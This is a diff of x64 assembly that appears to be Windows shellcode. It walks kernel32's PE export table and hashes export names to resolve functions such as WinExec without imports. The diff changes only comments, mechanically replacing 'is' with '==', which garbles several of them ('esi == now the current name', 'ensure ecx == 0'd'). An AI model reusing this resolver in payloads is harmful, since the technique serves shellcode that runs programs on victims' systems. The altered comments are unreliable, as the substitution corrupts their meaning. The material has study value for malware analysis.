@@ -63,7 +63,7 @@ GetProgramName:
 GetProcessAddress:		
 	mov r13, rcx                     ;base address of dll loaded - rdx has winexec, rcx has kernel32 addr
 	mov eax, [r13d + 0x3c]           ;skip DOS header and go to PE header
-	mov r14d, [r13d + eax + 0x88]    ;0x88 offset from the PE header is the export table. 
+	mov r14d, [r13d + eax + 0x88]    ;0x88 offset from the PE header == the export table. 
 	add r14d, r13d                  ;make the export table an absolute base address and put it in r14d.
 
 	mov r10d, [r14d + 0x18]         ;go into the export table and get the numberOfNames 
@@ -71,17 +71,17 @@ GetProcessAddress:
 	add ebx, r13d                   ;AddressofNames base. 
 	
 find_function_loop:	
-	jecxz find_function_finished   ; jump short if ecx is zero. nothing found 
+	jecxz find_function_finished   ; jump short if ecx == zero. nothing found 
 	dec r10d                       ;dec ECX by one for the loop
 	mov esi, [ebx + r10d * 4]      ;get a name to  from the export table. 
-	add esi, r13d                  ;esi is now the current name to search on. 
+	add esi, r13d                  ;esi == now the current name to search on. 
 	
 find_hashes:
 	xor edi, edi
 	xor eax, eax
 	cld
 
-;this block computes the hash for whatever is at esi	
+;this block computes the hash for whatever == at esi	
 continue_hashing:	
 	lodsb                         ;load byte at ds:esi to al
 	test al, al                   ;is the end of string resarched?
@@ -96,7 +96,7 @@ compute_hash_finished:
 	jnz find_function_loop        ;didn't match, keep trying!
 	mov ebx, [r14d + 0x24]        ;put the address of the ordinal table and put it in ebx. 
 	add ebx, r13d                 ;absolute address
-	xor ecx, ecx                  ;ensure ecx is 0'd. 
+	xor ecx, ecx                  ;ensure ecx == 0'd. 
 	mov cx, [ebx + 2 * r10d]      ;ordinal = 2 bytes. Get the current ordinal and put it in cx. ECX was our counter for which # we were in. 
 	mov ebx, [r14d + 0x1c]        ;extract the address table offset
 	add ebx, r13d                 ;put absolute address in EBX.
